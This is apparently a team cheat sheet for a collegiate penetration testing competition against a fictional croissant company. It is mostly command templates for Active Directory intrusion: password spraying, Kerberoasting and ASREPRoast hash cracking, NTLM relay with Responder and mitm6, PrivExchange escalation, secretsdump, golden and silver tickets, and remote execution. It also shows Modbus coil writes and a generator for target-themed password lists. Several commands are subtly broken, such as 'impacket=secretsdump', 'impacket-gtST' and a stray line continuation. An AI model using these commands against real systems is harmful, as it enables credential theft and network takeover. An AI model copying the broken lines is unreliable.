# 2021 Collegiate Penetration Testing Competition Packet

## Google Drive Structure

- `<name>/` - misc notes
  - `logs/` - from `~/logs`
  - `screenshots/`
- `scans/` - files each with one scan output
- `lists/` - username and password lists

## VDI Setup

### Windows VDI

Recommended software to install:

- Internet browser of choice
- Bitvise SSH client - https://bitvise.com/ssh-client-download
- Wireshark - https://www.wireshark.org/download.html
- Greenshot (screenshot) - https://getgreenshot.org/downloads/

### Linux VDI

Use Bitvise from Windows VDI to SSH to Linux VDI. On first login, do this to enable logging:

```bash
mkdir ~/logs
echo "script -f ~/logs/\$(date +%s).log" | tee -a ~/.bash_profile ~/.zprofile
```

Relogin to SSH. Every time you login, you should see `Script started`.

Optional Windows AD tools:

```bash
git clone https://github.com/fox-it/mitm6.git
cd mitm6
sudo pip install .
```

## Scripts

### Password List

Type into file `old.txt`:

```
august
september
october
november
summer
fall
winter
corona
covid19
croissant
lebonboncroissant
croissantlife
bonbon
```

Run this Python script (comments not needed):

```python
# Read the original passwords
with open("old.txt", "r") as f:
	o = list(filter(None, f.read().split("\n")))

# Add years
for x in o[:]:
	if not x[0].isdigit():
		o.append(x + "21")
		o.append(x + "2021")
		o.append(x + "1")

# Add capitals
for x in o[:]:
	if x[0].islower():
		o.append(x.capitalize())

# Add special characters
for x in o[:]:
	o.append(x + "!")
	o.append(x + "?")

# Write to file
with open("new.txt", "w") as f:
	f.write("\n".join(o))
```

Add `new.txt` to `lists/` in the Google Drive.

## Reconnaissance

Host discovery scan so hosts can be assigned:

```bash
sudo nmap <ip_range> -sL
```

Initial scan (add to new Google Drive file in `scans/`):

```bash
sudo nmap <ip_range> -T5 -sS -n -F -oN scan_short.txt
```

Much longer scan (add to a new Google Drive file in `scans/`):

```bash
sudo nmap <ip_range> -T5 -sS -n -p- -A --version-all -oN scan_long.txt
```

Add `-iL <filename>` to take in target IPs via a file. Add these options for a slower scan if you get blocked:

```bash
-f --mtu 32 --ttl 64 -T1
```

Dump traffic (use Bitvise on Windows to retrieve the PCAP and open it in Wireshark):

```bash
ip a # find name of interface
tcpdump -i <interface> -s 65535 -w dump.pcap
```

## Web

Find pages:

```bash
dirb <url_base>
```

Scan for vulnerabilities:

```bash
nikto -h <ip> -p <port> # can also pass file with list of IPs
```

## Windows AD

More resources at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md.

### Initial access

SMB recon:

```bash
enum4linux -a <ip>
```

Anonymous SMB login:

```bash
smbclient -L //<ip>
```

Anonymous LDAP to get naming contexts:

```bash
ldapsearch -H ldap://<ip> -x -s base '' "(objectClass=*)" "*" +
```

Anonymous LDAP to get other stuff (naming contexts is comma separated list of `dc=`):

```bash
ldapsearch -H ldap://<ip> -x -b <naming_contexts>
```

Spray passwords on SMB (careful locking accounts):

```bash
crackmapexec smb <ip> -u <username_list> -p <password_list> --continue-on-success
```

Spray passwords on Kerberos (https://github.com/ropnop/kerbrute/tags) (careful locking accounts):

```bash
./kerbrute userenum -d <domain_name> <username_list>
./kerbrute passwordspray -d <domain_name> <username_list> <password>
./kerbrute bruteuser -d <domain_name> username <password_list>
```

ASREPRoast (can also be done via Rubeus on Windows):

```bash
crackmapexec ldap <ip> -u <username_list> -p '' --asreproast output.txt\
hashcat -m18200 output.txt <password_list>
```

May get NTLMv2 hash (used when server will make arbitrary HTTP request):

```bash
responder -I <interface> --wpad
```

More on responder here: https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks

May get a shell (need mitm6):

```bash
mitm6 -i <interface> -d <domain_name>
impacket-ntlmrelayx -wh <your_ip> -t smb://<ip> -i # in new terminal
```

### Escalation

Kerberoasting (need domain account):

```bash
crackmapexec ldap <ip> -u <username> -p <password> --kerberoasting output.txt
hashcat -m13100 output.txt <password_list>
```

Same thing with impacket:

```bash
impacket-GetUserSPNs -request -dc-ip <ip> <domain_name>/<username>
```

Microsoft Exchange escalation:

```bash
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/privexchange.py
impacket-ntlmrelayx -t ldap://<ip> --escalate-user <username>
python privexchange.py -ah <your_ip> <hostname>.<domain_name> -u <username> -d <domain_name> -p <password> # in new terminal
secretsdump.py <domain_name>/<username><hostname>.<domain_name> -just-dc # in new terminal
```

Resource-based constrained delegation (need mitm6):

```bash
mitm6 -i <interface> -d <domain_name>
impacket-ntlmrelayx -t ldaps://<hostname>.<domain_name> -wh <your_ip> --delegate-access # in new terminal
impacket-gtST -spn cifs/<hostname>.<domain_name>/<new_username>\$ -dc-ip <ip> -impersonate Administrator # in new terminal
export KRB5CCNAME=Administrator.ccache
impacket=secretsdump -k -no-pass <hostname>.<domain_name>
```

Add DNS records (need to clone https://github.com/dirkjanm/krbrelayx):

```bash
python3 dnstool.py -u '<domain>\<username>' -p <password> -a add -r <new_record> -d <your_ip> <target_ip>
```

Might dump a hash from the LDAP server which can be used for silver ticket (need to clone https://github.com/micahvandeusen/gMSADumper):

```bash
python3 gMSADumper.py -u <username> -p <password> -d <domain> -l <ip>
```

Pass the hash with impacket (`lm_hash` is optional):

```bash
impacket-getTGT <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
```

Silver ticket with impacket:

```bash
impacket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
```

Golden ticket with impacket:

```bash
impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>
```

Use a ccache file to authenticate:

```bash
export KRB5CCNAME=<TGT_ccache_file>
impacket-psexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
impacket-smbexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
impacket-wmiexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
impacket-smbclient <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

## SCADA

Good summary: https://github.com/nationalcptc-teamtools/University-of-Southern-California/blob/main/misc/scada.txt.

### Modbus

Sniff traffic via `tcpdump` or Wireshark to understand the traffic. Pentration testing framework: https://github.com/theralfbrown/smod-1. Metasploit has a client:

```
use auxiliary/scanner/scada/modbusclient
show actions
set action <action_name>
show options
run
```

PyModbus (`pip install pymodbus`) can be used to read and write to registers:

```python
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient("127.0.0.1")
client.write_coil(1, True)
result = client.read_coils(1, 1)
print(result.bits[0])
client.close()
# https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html
```

## OSINT

### Companies

- Le Bonbon Croissant
  - Company receiving the test
  - Also sells candy
- Le Bonbon Muffin
  - Rival company
  - Wilma Wonka claims is stealing recipes
  - Slug is founder and president
  - Coupon code: `croissantsuck`

### People

- Wilma Wonka
  - Founder and President
  - With company since 1971
- Charlie Bucket
  - Chief Executive Officer
  - Born in 1957?
- 'Granpa' Jim Joseph
  - Principle Security Engineer
- Yael Corne
  - VP Risk and Compliance (DPO)
- Mike Devry
  - Senior Security Engineer
- Andrea Lefuvre
  - Customer Success Manager
